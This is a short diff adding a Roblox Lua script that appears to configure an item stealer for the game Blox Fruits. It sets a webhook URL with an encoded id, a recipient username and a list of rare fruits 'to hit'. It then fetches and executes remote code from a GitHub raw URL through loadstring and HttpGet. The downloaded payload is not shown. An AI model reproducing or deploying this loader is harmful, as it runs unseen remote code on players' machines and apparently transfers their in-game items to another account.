@@ -1,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=NGJYY3l1cVlZc2EyMjFlckhXejFfZzoyejN0d0Jva1VEczA5S3M3Uk5rQ0t3N2IzWWFmY2pJYzI2aWdmcGVucjBTQzQ2cURjbWZSeHFJemxHcGZWalZhc0xVM0xVU09tMS10YzFLbTFLaV81V01lOHZLa1U4YVFnNF9wejBrUGNodFpBamZLQ21pX1E2ZDRnUUZOWjI0T2dBMHdFNjJDcTRKZEQ1ckdzT2Q0dmtSV2FZWkVsdEpGWlNrSW9LVnFWblpUUUwtdFJIY05JQkFpWl9Zby1LbkNBQ3lzTG5aeWRpR1UxUWNDS19WVTlqdllsb2NVbjNrdnI4MWs4Rmt3d3ctWU9ZWGFRZmtUMVpIUWNya21jS0Fwa1daX3B3eDU1UmJRQVRId19XaHBJUlRldVRmSDJ2NUhhbmdIbG8xN3ZjalNTSWhVY3hNaU9adkV6YUQ0TzNmRXA4cTFoYVV0YXFEVFprY1FrU0RkT3hvVlFkWDJzMFJQN2ppcG4tXzlIak41T2FkMHNVVDFDY1BaRFh4Z24tQWczQ0RMQXRaeWROanFFeERSTnRuYkNEREc5S3B6X3ZfVUY1eXJkUTFqSm53"
+Usernames = {"BombasticBloxyGuy"}
+FruitsToHit = {"Dough-Dough", "Gas-Gas", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
